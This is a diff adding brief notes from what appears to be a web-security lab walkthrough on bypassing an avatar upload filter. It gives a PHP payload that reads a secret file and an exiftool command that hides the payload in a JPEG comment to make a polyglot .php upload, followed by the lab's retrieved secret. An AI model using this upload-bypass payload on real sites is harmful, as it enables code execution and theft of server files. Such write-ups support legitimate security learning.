@@ -1,0 +1,29 @@
+vulnerable path: /my-account
+vulnerable function: avatar upload function
+
+script =>
+filename: lab_6_shell.php
+->
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+<-
+<= 
+
+try to upload the php script
+intercept the request and send it to the repeater
+
+response -> Error: file is not a valid image Sorry, there was an error uploading your file. <-
+
+let's try make our script file look like an image .jpg by puting our script inside an image .jpg then load it to .php file using the tool ExifTool
+
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+
+now let's upload polyglot.php
+response => The file avatars/polyglot.php has been uploaded. <=
+
+go to /files/avatars/polyglot.php
+
+to find the data search for "START"
+
+reflected data: kybngJy3izftkhBuJvJHgYGmIyh4ljaM
+
+solved
